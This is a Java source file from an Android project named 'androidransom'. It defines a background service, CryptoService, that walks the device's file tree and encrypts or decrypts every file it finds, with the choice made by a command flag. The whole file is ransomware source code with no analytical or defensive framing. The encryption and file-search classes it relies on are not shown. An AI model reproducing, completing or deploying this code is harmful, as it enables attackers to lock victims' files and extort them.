package bycracks.androidransom;

import android.app.IntentService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.widget.Toast;

import java.io.File;


public class CryptoService extends IntentService {
    Handler mHandler;

    public CryptoService() {
        super("CryptoService");
        mHandler = new Handler();
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(this, "start service", Toast.LENGTH_SHORT).show();
    }

    @Override
    public IBinder onBind(Intent arg0) {
        super.onBind(arg0);
        return null;
    }
    private class DisplayToast implements Runnable{
        private final Context mContext;
        String mText;

        public DisplayToast(Context mContext, String text){
            this.mContext = mContext;
            mText = text;
        }

        public void run(){
            Toast.makeText(getBaseContext(), mText, Toast.LENGTH_SHORT).show();
        }
    }
    @Override
    protected void onHandleIntent(Intent intent) {
        boolean decrypt = intent.getBooleanExtra("decrypt",true);

        try {
            Crypto tool = new Crypto();
            SearchFiles dir = new SearchFiles();

            dir.searchAllFile(dir.getTopDir(), decrypt);
            tool.crypto(dir.fileList, decrypt);
        } catch (Exception e) {
            mHandler.post(new DisplayToast(this, "Hello"));
            //Toast.makeText(this, e.getMessage().toString(), Toast.LENGTH_SHORT).show();
        }
        if (decrypt)    mHandler.post(new DisplayToast(this, "decode Command Clear"));
        else mHandler.post(new DisplayToast(this, "encode Command Clear"));

        onDestroy();

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "Service end", Toast.LENGTH_SHORT).show();
    }

}
